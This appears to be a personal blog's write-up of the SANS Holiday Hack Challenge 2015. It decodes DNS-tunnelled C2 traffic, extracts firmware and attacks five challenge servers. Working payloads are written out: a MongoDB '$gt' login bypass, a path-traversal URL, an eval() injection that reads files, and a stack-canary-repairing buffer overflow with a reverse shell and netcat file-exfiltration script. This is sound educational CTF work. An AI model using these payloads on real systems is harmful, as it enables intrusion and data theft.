---
layout: post
title: "SANS Holiday Hack Challange 2015: Writeup"
date: 2015-12-29 08:30
type: post
published: true
comments: true
categories: ctf
---

This post contains the write-up I submitted for the 2015 SANS Holiday Hack challenge. Enojy.

First of all I want to thank you for a nice and educating challenge.
It was a great pleasure solving it.
I don't really know what level of detail you expect from the submssions so I will first just briefly state the answers to the questions and below follow up with some more in-depth explanations of how I arrived at them. I hope this format suits you.

## Answers to the questions

1. DNS TXT Queries are sent from the gnome to the CnC server to ask for commands.
   Responses are sent in the TXT query responses encoded as base64 strings.
   Among other things, the uploads a JPEG file through a DNS TXT response

2. An image of a bedroom with the text "GnomeNET-NorthAmerica"

3. The gnome is running OpenWRT on an ARM architechture. The Gnome's web interface is built on NodeJS with the Express web framework.

4. The gnome uses MongoDB and the plaintext stored in it is "SittingOnAShelf"

5. Using Shodan to search for GIYH results in 5 targets as follows. These all check out with Tom Hessman
	* 52.2.229.189 United States, Ashburn
	* 52.34.3.80 United States, Boardman
	* 52.64.191.71 Australia, Sydney
	* 52.192.152.132 Japan, Tokyo
	* 54.233.105.81 Brazil

6. See answer 5.

7. The five super gnomes has the following vulnerabilities:
	1. No real vulnerability. It is possible to log in with the extracted credentials (admin/SittingOnAShelf) and download the files from the file menu.
	2. This gnome has a LFI vulnerability that is caused by the combination of two bugs. First, the settings upload function does not properly sanitize the uploaded file name which allows the creation of a directory named <random chars>/.png/. Second, the camera viewer allows for directory traversal and only adds ".png" as a suffix if it is not already found in the filename.
	3. Here, the password for the admin user is changed but this gnome has an injection vulnerability in the login function. There is no escaping of the username and password which allows for a MongoDB injection. When logged in, the files can simply be downloaded from the files menu.
	4. This gnome has a code injection vulnerability. The postproc input in the file upload menu is not sanitized and then passed to eval(). The result of this call is displayed to the user.
	5. This gnome runs a service on port 4242 which has a buffer overflow vulnerability. It uses a static stack canary which can be subverted. Using carefully crafted input will bypass the stack canary and the ASLR to provide a reverse shell.

8. The five gnomes were exploited as follows. Note that anywhere "gnome.conf" is mentioned this can be repeated for all the six files:
	1. Simply log in with (admin/SittingOnAShelf) and download the files in the files menu.
	2. This is a two step attack in which the second step is repeated for all six files:
		a. Upload settings file with name ".png/whatever". This creates the directory "gnome/www/public/upload/llCkTnXD/.png/".
		b. "http://52.34.3.80/cam?camera=../../public/upload/llCkTnXD/.png/../../../../files/gnome.conf"
	3. Login using a JSON encoded POST body with the following content, then simply download the files from the files menu:
	> {
	>   "username": "admin",
	>   "password": {"$gt": ""}
	> }
	4. Upload any dummy png file with the "postproc" form field set to "new Buffer(fs.readFileSync('/gnome/www/files/gnome.conf')).toString('base64')" This will give you back a string which can then be base 64 decoded to get the file. Repeat this for all six files. 
	5. First we prepare our reverse shell by running the following command which will send back a base64 encoded file to us:
	> echo "cat /gnome/www/files/gnome.conf | base64" | nc -l 55555 | base64 -d > gnome.conf  

		Then we connect to the service and send "X\n" to the server to get to the secret command. Then we send a payload consisting of the following parts.
		
		1. 103\*A, this is just garbage to start overflowing the buffer.
		2. 0xe4ffffe4, to repair the stack canary.
		3. 4\*A, to pad before the return address.
		4. 0x0804936b, which is the location of "jmp esp" to jump the instruction pointer back to our shellcode
		5. The actual shellcode which connects back to port 55555 on my IP with a reverse shell
		6. 100\*A, to make sure we send at least 200 characters so that the receive function returns quickly

9. The plan is to hire burglars to steal the christmas from people all over the world on Christmas eve as a revenge for a traumatic childhood event.

10. ATNAS Corp, Cindy Lou Who

## Explanations and method

Now I will go through the process I little more in detail to explain how I managed to arrive at those answers.

### Part 1: Network analysis
First, I used Wireshark to look at the PCAP file.
Here, the DNS conversations are clearly shown.
Looking at the TXT fields in the Wireshark decoder it was easy to see that data was being sent back and forth.

Secondly, I looked at the provided script and played around with it to decode some of the data being sent.
I doscovered the "NONE", "EXEC" and "FILE" keywords and also the "START\_STATE" and "END\_STATE" delimiters.
With this knowledge, I extended the script to create a small parser for the protocol.

The script decodes the commands being sent and the results of them by identifying the delimiters "START\_STATE" and "END\_STATE".
It also properly decodes the file transfer by differentiating between the request, the file name, the delimiters ("START\_STATE"/"END\_STATE") and the actual file contents.

The script is shown below:

{% highlight python %}
#!/usr/bin/env python
# Copyright (c) 2105 Josh Dosis
import base64
from scapy.all import *     # This script requires Scapy

# Read the capture file into a list of packets
packets=rdpcap("giyh-capture.pcap")

def tee(file, line):
    file.write(line)
    print(line),

# Open the output file to save the extracted content from the pcap
with open("log.txt","w") as log:
    state = None
    for packet in packets:
        # Make sure this is a DNS packet, with the rdata record where the content is stored
        if (DNS in packet and hasattr(packet[DNS], 'an') and hasattr(packet[DNS].an, 'rdata')):

            # Make sure it's from the Gnome, not the server
            if packet.sport != 53: continue

            # Decode the base64 data
            data = packet[DNSRR].rdata
            decode=base64.b64decode(data)

            # Split into command and data
            cmd = decode[:5]
            arg = decode[5:]

            if cmd == 'EXEC:':
                if arg == 'START_STATE':
                    state = ""
                elif arg == 'STOP_STATE':
                    tee(log, state)
                    state = None
                elif state != None:
                    state += arg
                else:
                    tee(log, cmd+arg)
            if cmd == 'NONE:':
                tee(log, cmd+'\n')

            if cmd == 'FILE:':
                if state == None:
                    args = arg.strip().split(',')
                    if args[0] == 'START_STATE':
                        name = args[1].split('/')[-1]
                        state = open(name, 'wb')
                    else:
                        tee(log, cmd+arg)
                elif arg == 'STOP_STATE':
                    state.close()
                else:
                    state.write(arg)
{% endhighlight %}                    

By running this script, we directly get out both the command log, "log.txt" and the transferred image, "snapshot_CURRENT.jpg" with no extra processing required.

With this, we can answer question one and two: DNS and "GnomeNET-NorthAmerica".

### Part 2: Firmware analysis

By running binwalk on the firmware image, we see that it consists of three parts:
  1. A certificate
  2. The firmware binary, a 32-bit ELF compiled for ARM. This gives us the first half of the answer.
  3. A SquashFS file system

> binwalk giyh-firmware-dump.bin 
> 		
> 	DECIMAL       HEXADECIMAL     DESCRIPTION
> 	--------------------------------------------------------------------------------
> 	0             0x0             PEM certificate
> 	1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
> 	168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015

Using the "-e" flag with binwalk, I extracted the SquashFS filesystem.
Then by using the tool "unsquashfs", I decompressed into a regular directory which can be explored.

By looking at the "init" file in the root, we suspect that the Gnome is running OpenWRT.

> cat squashfs-root/init
>
> 	#!/bin/sh
> 	# Copyright (C) 2006 OpenWrt.org
> 	export INITRAMFS=1
> 	exec /sbin/init

Searching for the string "openwrt" in the file system yields 239 hits and we conclude that this is OpenWRT.

> grep -ri openwrt squashfs-root | wc -l
>
> 	239

Now we can answer questions three: ARM, OpenWRT

Looking at the code of the web app in the /www/ directory, we find several references to MongoDB.
Specifically, we can see in, for example, /www/app.js that it uses MongoDB with the Monk interface library to access a database named "gnome" in the local mongo instance

To analyze this database, I copied the data files into my local mongo instance and used the mongo client to view the data.
It looked like this:

{% highlight shell %}
$ sudo cp squashfs-root/opt/mongodb/gnome.* /var/lib/mongodb  
$ sudo service mongodb restart  
$ mongo  
$ use gnome  
	switched to db gnome
$ db.users.find()
	{ "_id" : ObjectId("56229f58809473d11033515b"), "username" : "user", "password" : "user", "user_level" : 10 }
	{ "_id" : ObjectId("56229f63809473d11033515c"), "username" : "admin", "password" : "SittingOnAShelf", "user_level" : 100 }
{% endhighlight %}

And thus we have the answer to question four: MongoDB, SittingOnAShelf

### Part 3: Recon

Using Shodan to search for related machines is a good idea.
To do that, I needed something that is unique for this software.
Looking at the code in the /www/ directory, I saw that the title of the pages were "GIYH::ADMIN PORT V.01" and that some headers said "GIYH Administrative Portal".
That four letter abbreviation seemed like a unique enough string to search for.
I [searched for just the string "GIYH" in Shodan](https://www.shodan.io/search?query=GIYH%3A%3ASuperGnome) and it gave me back exactly five results. The hits were:

* 52.2.229.189: United States, Ashburn
* 52.34.3.80: United States, Boardman
* 52.64.191.71: Australia, Sydney
* 52.192.152.132: Japan, Tokyo
* 54.233.105.81: Brazil

I have not included the full results here for brevity but they are available in the link above.
Anyway, this solves question five and six since we have the five IP addresses and their location.

### Part 4: Exploitation

Now it was time for the fun part: find vulnerabilitites and exploit the targets.
I will go through one gnome at a time and explain the vulnerability and how I exploited it.
In all Super Gnomes except SG-03 it was possible to login with the credentials leaked from the MongoDB: admin/SittingOnAShelf.
The goal in each Super Gnome was to download the files stored in the /www/files/ directory, specificaly the one called "factory\_cam\_x.zip" and the one called "<somedate>.zip".
Furthermore, I will discribe the process for each Super Gnome individually but in reality I first looked in the code to find vulnerabilities and then worked back and forth to figure out which vulnerability was applicable to which Super Gnome.

In short, the first Super Gnome required no exploitation, the next three required me to exploit the web application and the last one required me to exploit the sgstatd binary service. I started looking at the code in the web app and noted that there were several comments. Some of the comments related to commented out code which was extra interesting since it had bugs. After some trial and error I realized that each bug was present in one of the Super Gnomes.

#### SG-01: Leaked credentials

This Super Gnome required no exploitation. I simply tried to login in with the leaked credentials and was able to download the files from the files menu.
This gave me the "sgnet.zip" file which contained sources for the binary exploited in SG-05.

#### SG-02: Local File Inclusion

This time it was possible to login with the credentials but the downloads had been disabled. This attack required a combination of two vulnerabilities. First, looking at the settings upload function (starting at /routes/index.js:128), we see that it creates a directory name on row 131 by combining a randomly generated name (newdir()) with the user-supplied file name. Then it actually creates this directory on row 138 by taking the dirname variable and splitting at the last occurrence of "/". This means that if we supply a file name containing a slash, we can control the name of one or more subdrectories. By submitting any file with the name set to, for example, ".png/abc", we create a directory like "gnome/www/public/upload/llCkTnXD/.png/".

{% highlight javascript %}
// SETTINGS UPLOAD
router.post('/settings', function(req, res, next) {
if (sessions[sessionid].logged_in === true && sessions[sessionid].user_level > 99) { // AUGGIE: settings upload allowed for admins (admins are 100, currently)
    var filen = req.body.filen;
    var dirname = '/gnome/www/public/upload/' + newdir() + '/' + filen;
    var msgs = [];
    var free = 0;
    disk.check('/', function(e, info) {
      free = info.free;
    });
    try {
      fs.mknewdir(dirname.substr(0,dirname.lastIndexOf('/')));
...
{% endhighlight %}

So, why is this interesting? If we look at the camera feed viewer (starting at /routes/index.js:184), we see that it takes a user supplied camera value and appends ".png". The commented out code however indicates that it only does this if ".png" if not already found in the string.

{% highlight javascript %}
router.get('/cam', function(req, res, next) {
  var camera = unescape(req.query.camera);
  // check for .png
  //if (camera.indexOf('.png') == -1) // STUART: Removing this...I think this is a better solution... right?
  camera = camera + '.png'; // add .png if its not found
  console.log("Cam:" + camera);
  fs.access('./public/images/' + camera, fs.F_OK | fs.R_OK, function(e) {
    if (e) {
	    res.end('File ./public/images/' + camera + ' does not exist or access denied!');
    }
  });
  fs.readFile('./public/images/' + camera, function (e, data) {
    res.end(data);
  });
});
{% endhighlight %}

That means that if we supply a string like "../../public/upload/llCkTnXD/.png/../../../../files/gnome.conf", it will not add ".png" to the end and "fs.readFile" will be called with our input value unmodified. However, the path must be fully valid, which means that there has to exist a directory called ".png". This is why the first part was needed. The result is that by accessing a URL such as "http://52.34.3.80/cam?camera=../../public/upload/llCkTnXD/.png/../../../../files/gnome.conf" it is possible to download any file the web app can access. Using this, I downloaded the six files in the files menu.

#### SG-03: MongoDB Injection

In this Super Gnome the admin password had been changed and it was not possible to login with (admin/SittingOnAShelf). However, looking at the login function (starting at /routes/index.js:106), we see that the user input is sent unsanitized to the database on row 110.

{% highlight javascript %}
// LOGIN POST
router.post('/', function(req, res, next) {
  var db = req.db;
  var msgs = [];
  db.get('users').findOne({username: req.body.username, password: req.body.password}, function (err, user) { // STUART: Removed this in favor of below.  Really guys?
  //db.get('users').findOne({username: (req.body.username || "").toString(10), password: (req.body.password || "").toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars
...
{% endhighlight %}

This allows for a MongoDB injection, similar to a classical SQL injection. One way to do this is to notice that the ExpressJS framework is used with the body-parser middleware (app.js:20-21). This means that we can send our HTTP POST data as JSON and create the following payload:

> {
>   "username": "admin",
>   "password": {"$gt": ""}
> }

This is then directly unserialized and sent to the Mongo "findOne" function which creates a query which says: "find the user with username = admin and a password which is greater than the empty string". Only the admin user will satisfy the first clause and any text string, i.e. any password will satisfy the second clause. This means that the admin user will be found, no matter the actual password of that user and we will be logged in as admin.

When this has been done, it was simply a matter of going to the files menu and downloading the six files.

#### SG-04: Javasctipt Code Injection

This vulnerability took slightly longer to find since it was not related to any of the comments, however I spotted a call to "eval()" in the code which is almost always a warning sign. Looking at the upload file function (starting at /routes/index.js:154) we can see that the value of the variable "postproc" is sent unsanitized to "eval()" and the result of that call is then sent back to the user.

{% highlight javascript %}
// FILES UPLOAD
router.post('/files', upload.single('file'), function(req, res, next) {
  if (sessions[sessionid].logged_in === true && sessions[sessionid].user_level > 99) { // NEDFORD: this should be 99 not 100 so admins can upload
    var msgs = [];
    file = req.file.buffer;
    if (req.file.mimetype === 'image/png') {
      msgs.push('Upload successful.');
      var postproc_syntax = req.body.postproc;
      console.log("File upload syntax:" + postproc_syntax);
      if (postproc_syntax != 'none' && postproc_syntax !== undefined) {
        msgs.push('Executing post process...');
        var result;
        d.run(function() {
          result = eval('(' + postproc_syntax + ')');
        });
        // STUART: (WIP) working to improve image uploads to do some post processing.
        msgs.push('Post process result: ' + result);
	  ...
{% endhighlight %}

The value of "postproc" comes from a dropdown field but we can of course set it to whatever we want. Using the function "fs.readFileSync()" we can read a file blockingly and returning the contents of that file. That is exactly what we need. For the text files such as "gnome.conf", this works fine, however for the zip files, this becomes a little bit messy. To make the transfer more robust, we use the NodeJS native object "Buffer" to convert the base 64 encode the contents before returning it to the client.

So, by uploading any dummy file and setting the "postproc" POST variable to "new Buffer(fs.readFileSync('/gnome/www/files/gnome.conf')).toString('base64')", we get a call which looks like this:

{% highlight javascript %}
msgs.push(
	"Post process result: " + 
	eval(
		"new Buffer(
			fs.readFileSync('/gnome/www/files/gnome.conf')
		).toString('base64')"
	)
)
{% endhighlight %}

Thus, we get the contents of the specified file rendered on the client as a base 64 encoded string which can then be base 64 decoded to get that file. This can then be repeated for all of the six files.

#### SG-05: Buffer Overflow

Doing an "nmap" scan of this super gnome revealed a service running on port 4242. Connecting to this port with "netcat" presented us with a menu with three choices. This corresponded exactly to the code found in sgnet.zip. Looking at this code (specifically sgstatd.c:66) I found a fourth command which called the "sgstatd()" function. This function has to properties that immediately sticks out: it has buffer overflow vulnerability on row 147 since it reads 200 bytes into a 100 byte large buffer, and it also has a stack canary looking feature on row 140 and 148.

{% highlight c %}
int sgstatd(sd)
{
	__asm__("movl $0xe4ffffe4, -4(%ebp)");
	//Canary pushed

	char bin[100];
	write(sd, "\nThis function is protected!\n", 30);
	fflush(stdin);
	//recv(sd, &bin, 200, 0);
	sgnet_readn(sd, &bin, 200);
	__asm__("movl -4(%ebp), %edx\n\t" "xor $0xe4ffffe4, %edx\n\t"	// Canary checked
		"jne sgnet_exit");
	return 0;
}
{% endhighlight  %}

I must say that I liked this idea of introducing how to repair a stack canary without the process of leaking it (which is required for regular random canaries). Checking the binary with the "checksec" command of PEDA, I saw that it had no other protection mechanisms activated. Assuming that the system has ASLR activated, we just had to defeat that and repair the canary to exploit it.

First I got some shellcode. I have heard that real hackers write their own, but I have also heard that it's unnecessary to invent the wheel twice, so I grabbed a reverse shell shellcode from Shell Storm. Secondly, to defeat the ASLR, I wanted a "jmp esp" gadget. For this I needed a compiled version of the binary. Luckily it was found in "/usr/bin/sgstatd" of the gnome firmware. Running the tool "ROPGadget" on this binary gave me the gadget address.

>  ROPgadget --binary sgstatd  
>   
> 	...  
> 	0x0804936b : jmp esp  
> 	...  

I also needed to know exactly where the canary ended up in relation to the buffer. This was done by running the binary locally and sending a payload of blocks of four letters, i.e. "AAAABBBBCCCC..." etc. and then breaking at the "movl -4(%ebp)" instruction. By doing this, I fiured out that I needed 103 bytes of whatever followed by the canary value "0xe4ffffe4". I then did the same thing to figure out exactly where there the saved return address was located to know where to put the address to "jmp esp".

As a final preparation, I needed to setup the reverse shell listener. I wanted to send a command to give me back one file. Again, to make the transfer robust, I wanted to base 64 encode it. So, I set up netcat to listen on port 55555 and gave it the command "cat <file> | base64" and then piped the response to "base64 -d" to decode the data on my side. I had a script which looked like this.

{% highlight shell %}
#!/bin/sh  
echo "cat /gnome/www/files/20151215161015.zip | base64" | nc -l 55555 | base64 -d > 20151215161015.zip  
echo "cat /gnome/www/files/factory_cam_5.zip | base64" | nc -l 55555 | base64 -d > factory_cam_5.zip  
echo "cat /gnome/www/files/gnome.conf | base64" | nc -l 55555 | base64 -d > gnome.conf  
echo "cat /gnome/www/files/gnome_firmware_rel_notes.txt | base64" | nc -l 55555 | base64 -d > gnome_firmware_rel_notes.txt  
echo "cat /gnome/www/files/sgnet.zip | base64" | nc -l 55555 | base64 -d > sgnet.zip  
echo "cat /gnome/www/files/sniffer_hit_list.txt | base64" | nc -l 55555 | base64 -d > sniffer_hit_list.txt  
{% endhighlight  %}

Now I created and sent the actual payload which consisted of the following parts:

1. 103 bytes with the value "A"
2. The value 0xe4ffffe4 packed as 4 bytes
3. 4 bytes of padding with the value "A"
4. 4 bytes with the address to "jmp esp"
5. The shellcode, roughly 70 bytes long
6. 100 bytes with the value "A" to make sure that the read function read 200 bytes and returned quickly.

When I sent this, the following happened:

1. The canary is overwritten by the same value it already had, making sure that the condition at the end still passes
2. The return instruction is overwritten with the address of "jmp esp"
3. The shellcode is placed at the location where the top of the stack will be after "ret" has been called and the current frame removed.
4. "ret" is called and the current frame is removed, making ESP point to the shellcode.
5. The program jumps to "jmp esp" and it is executed.
6. The program jumps to the location of ESP which is where the shellcode is placed
7. The shellcode is executed which starts a reverse shell and connects back to my IP on port 55555.
8. The command "cat /gnome/www/files/20151215161015.zip | base64" is received and executed and the result sent back.
9. The output from netcat is sent to "base64 -d" and the result saved as a file. A file has successfully been extracted from the host.
10. This is repeated six times, once for each file.

### Part 5: Intelligence

Finally, with all the zip files extracted it is time to uncover this plot. Starting with the PCAP files, I looked at them in Wireshark. The first four each contained a SMTP session with the user "c@atnascorp.com" sending a single mail. The fifth one contained an POP3 session, with the user "c@atnascorp.com" retrieving a single mail.

The contents of the mails are as follows:
1. A mail from C (using the signature "C") to jojo@atnascorp.com describing the architecture for a distributed surveillance system. The mail has a JPEG file attached which (after being base 64 decoded) shows a sketch confirming that the Gnomes are running ARM and the super gnomes running x86-64 (interesting, since the "sgstatd" binary was compiled as 32-bit x86).
2. A mail from C (using the signature "CW") to supplier@ginormouselectronicssupplier.com putting an order on hardware for 2 million gnomes.
3. A mail from C (using the signature "CLW") to burglerlackeys@atnascorp.com describing the plan to break into people's houses on the evening of December 24th: "Instead of bringing presents on Christmas, we'll be stealing them!". 
4. A mail from C (using the signature "Cindy Lou Who") to psychdoctor@whovillepsychiatrists.com asking for some advice on her mental and telling a story of a traumatic event in her childhood when the Grinch stole her christmas.
5. This is Cindy receiving an e-mail from The Grinch <grinch@who-villeisp.com> where he apologizes for what he did that christmas long ago. (Naaaaw!)

Ok. So the mastermind and the evil plot is uncovered, but what about the images?
Looking at the support conversation on the GnomeNET page on the super gnomes we get the hint that the image in "camera\_feed\_overlap\_error.png" is the feed from five random gnomes and the image from the gnome in Cindy's office XOR:ed together.

This means that by XOR:ing the "camera\_feed\_overlap\_error.png" with all of the "factory\_cam\_X.png" images, we should get the sixth image back. Mathematically this works like this:
* The overlap image: R = C1 + C2 + C3 + C4 + C5 + C6, where C1-C6 denotes the six component images and the plus denotes the XOR operation.
* Then: R = C1 + C2 + C3 + C4 + C5 = R = (C1 + C1) + (C2 + C2) + (C3 + C3) + (C4 + C4) + (C5 + C5) + C6 = C6

In practice this can, for example, be done from the command line with ImageMagick:

{% highlight shell %}
convert images/camera_feed_overlap_error.png images/factory_cam_1.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" 01.png
convert 01.png images/factory_cam_2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" 012.png
convert 012.png images/factory_cam_3.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" 0123.png
convert 0123.png images/factory_cam_4.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" 01234.png
convert 01234.png images/factory_cam_5.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" final.png
{% endhighlight %}

Looking at "final.png", we see an image of Cindy Lou Who and we have finally completely answered questions nine and ten: Cindy Lou Who, CEO of ATNAS Corp wanted to steal the christmas from 2 million people around the world as revenge for a traumatic childhood event.
